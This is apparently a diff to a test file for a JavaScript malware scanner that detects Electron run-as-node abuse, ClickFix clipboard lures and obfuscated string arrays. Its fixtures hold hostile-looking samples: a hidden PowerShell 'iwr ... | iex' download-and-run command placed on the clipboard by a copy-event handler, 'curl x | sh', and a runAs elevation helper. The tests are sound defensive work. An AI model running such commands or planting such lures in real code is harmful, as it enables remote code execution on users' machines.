@@ -50,6 +50,10 @@ const args = '-NoProfile -WindowStyle Hidden -File x.ps1';`;
   const error = inspect(hidden).findings.find(f => f.kind === 'electron-run-as-node');
   assert.equal(error.severity, 'error');
   assert.match(error.detail, /hides execution/);
+  // A bundled elevation helper elsewhere in the file does not escalate.
+  const bundle = `function elevate(p){ return ['Start-Process', p, '-WindowStyle hidden', '-Verb runAs'].join(' '); }
+function agent(sh, cmd){ sh.exec(\`ELECTRON_RUN_AS_NODE=1 /bin/sh -c "\${cmd}" &\`); }`;
+  assert.equal(inspect(bundle).findings.find(f => f.kind === 'electron-run-as-node').severity, 'warning');
 });
 
 test('Electron: assignment of the variable and hidden script paths are warnings', () => {
@@ -98,8 +102,9 @@ test('string array without a checksum: RC4 resolves by consensus, keyless base64
 });
 
 test('evaluator refuses impure or unsupported expressions', () => {
+  // The ClickFix rule still harvests text stored into s; the value is not resolved.
   const result = inspect("let s = 'curl x | sh'; s = 'echo'; navigator.clipboard.writeText(s);");
-  assert.equal(result.findings[0].detail, 'dynamic argument; unresolved');
+  assert.equal(result.findings.find(f => f.kind === 'clipboard-write').detail, 'dynamic argument; unresolved');
   assert.equal(inspect("navigator.clipboard.writeText(fetchText());").findings[0].detail, 'dynamic argument; unresolved');
 });
 
@@ -134,4 +139,18 @@ test('string array: a parameterless minified rotation loop is solved, never assu
   // If the loop exists but cannot be solved, the array must stay unresolved.
   const broken = fixture.source.replace(/if\(([^=]+)==/, 'if(0.5==') + `use(${fixture.call('gamma')});`;
   assert.notEqual(inspect(broken).deobfuscation[0].method, 'unrotated');
+});
+
+test('TypeScript and JSX fall back to Babel AST-only parsing with the same rules', () => {
+  const ts = inspect(`const cmd = 'powershell -w hidden -nop -c "iwr https://example.invalid/a | iex"' as string;
+document.addEventListener('copy', (e: ClipboardEvent) => { e.clipboardData!.setData('text/plain', cmd); });`, { filename: 'lure.ts' });
+  assert.equal(ts.parser, 'babel:typescript');
+  assert.equal(ts.findings.find(f => f.kind === 'clickfix-clipboard-command').severity, 'error');
+  const jsx = inspect('const b = <button onClick={() => navigator.clipboard.writeText("x")}>Copy</button>;', { filename: 'b.jsx' });
+  assert.equal(jsx.parser, 'babel:jsx');
+  assert.equal(jsx.findings[0].kind, 'clipboard-write');
+  // Without a file name the dialect is tried in turn.
+  assert.match(inspect('let n: number = 1;').parser, /^babel:/);
+  assert.equal(inspect('const x = 1;').parser, 'acorn');
+  assert.throws(() => inspect('const = ;', { filename: 'bad.ts' }), SyntaxError);
 });
